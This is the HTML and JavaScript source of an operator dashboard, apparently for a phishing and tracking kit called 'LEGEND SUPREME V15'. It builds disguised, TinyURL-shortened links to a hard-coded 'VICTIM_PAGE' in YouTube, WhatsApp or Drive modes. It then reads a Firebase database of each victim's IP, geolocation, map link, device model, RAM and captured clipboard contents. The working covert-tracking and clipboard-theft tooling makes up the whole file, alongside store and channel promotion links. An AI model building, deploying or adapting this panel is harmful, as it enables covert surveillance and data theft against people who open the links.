<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LEGEND HQ V15 | SUPREME</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
        body { background: #f4f7f9; font-family: 'Poppins', sans-serif; margin: 0; padding: 15px; }
        .container { max-width: 500px; margin: auto; }
        .card { background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); margin-bottom: 15px; }
        h1 { color: #00a884; font-size: 1.2rem; text-align: center; margin-top: 0; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; outline: none; box-sizing: border-box; }
        .btn { width: 100%; padding: 12px; border: none; border-radius: 10px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-top: 5px; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
        .stat-box { background: #00a884; color: white; padding: 10px; border-radius: 15px; text-align: center; font-size: 0.8rem; }
        .log-card { background: white; padding: 15px; border-radius: 15px; margin-top: 10px; border-left: 5px solid #00a884; font-size: 0.8rem; position: relative; }
        .flag-img { width: 25px; vertical-align: middle; margin-left: 5px; border-radius: 3px; }
        pre { background: #f8f9fa; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-break: break-all; font-size: 0.75rem; border: 1px solid #eee; }
        .social-links { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 5px; margin-top: 20px; }
        .social-links a { text-decoration: none; color: white; font-size: 0.65rem; padding: 10px; border-radius: 8px; text-align: center; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>LEGEND SUPREME V15</h1>
            
            <div class="stats-grid">
                <div class="stat-box">TRACKS: <span id="trackCount">0</span></div>
                <div class="stat-box">CLIPS: <span id="clipCount">0</span></div>
            </div>

            <input type="text" id="masterKey" placeholder="Secret Key">
            <input type="text" id="targetUrl" placeholder="Target Redirect URL">
            <select id="mode">
                <option value="yt">YouTube Mode</option>
                <option value="wa">WhatsApp Mode</option>
                <option value="drive">Google Drive Mode</option>
            </select>
            <button class="btn" onclick="generateLink()">GENERATE SUPREME LINK</button>
            <div id="linkRes" style="font-size: 0.7rem; color: #00a884; margin-top: 10px; word-break: break-all; text-align: center;"></div>
        </div>

        <div style="display: flex; gap: 8px;">
            <button class="btn" style="background:#333" onclick="fetchLogs('tracking')">LOGS</button>
            <button class="btn" style="background:#333" onclick="fetchLogs('clipboard')">CLIPS</button>
        </div>

        <div id="displayArea"></div>

        <div class="social-links">
            <a href="https://legend-mods-store.vercel.app/" style="background:#2c3e50;">STORE</a>
            <a href="https://whatsapp.com/channel/0029VarS46O3QxRtTZO0z60x" style="background:#25d366;">WHATSAPP</a>
            <a href="https://www.youtube.com/@legendmod407" style="background:#ff0000;">YOUTUBE</a>
        </div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
        const VICTIM_PAGE = "https://video-obtg.vercel.app/";

        function generateLink() {
            const k = document.getElementById('masterKey').value;
            const r = document.getElementById('targetUrl').value;
            const m = document.getElementById('mode').value;
            if(!k || !r) return alert("Fill all!");
            
            const longUrl = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r, m}))}`;
            fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`)
                .then(res => res.text())
                .then(short => { document.getElementById('linkRes').innerHTML = `<b>Link:</b> ${short}`; });
        }

        async function fetchLogs(path) {
            const key = document.getElementById('masterKey').value;
            const res = await fetch(`${DB_URL}${path}/${key}.json`);
            const data = await res.json();
            const area = document.getElementById('displayArea');
            area.innerHTML = "";
            if(!data) return;

            const keys = Object.keys(data);
            if(path === 'tracking') document.getElementById('trackCount').innerText = keys.length;
            else document.getElementById('clipCount').innerText = keys.length;

            keys.reverse().forEach(id => {
                const item = data[id];
                if(path === 'tracking') {
                    area.innerHTML += `
                    <div class="log-card">
                        <b>üïí ${item.time}</b><br>
                        üåê IP: ${item.ip} <img src="${item.flag}" class="flag-img"><br>
                        üìç ${item.loc}<br>
                        üì± ${item.model} | üß† ${item.ram}GB<br>
                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold; text-decoration:none;">[ OPEN MAP ]</a>
                    </div>`;
                } else {
                    area.innerHTML += `<div class="log-card"><b>üïí ${item.time}</b><pre>${item.clipData}</pre></div>`;
                }
            });
        }
    </script>
</body>
</html>
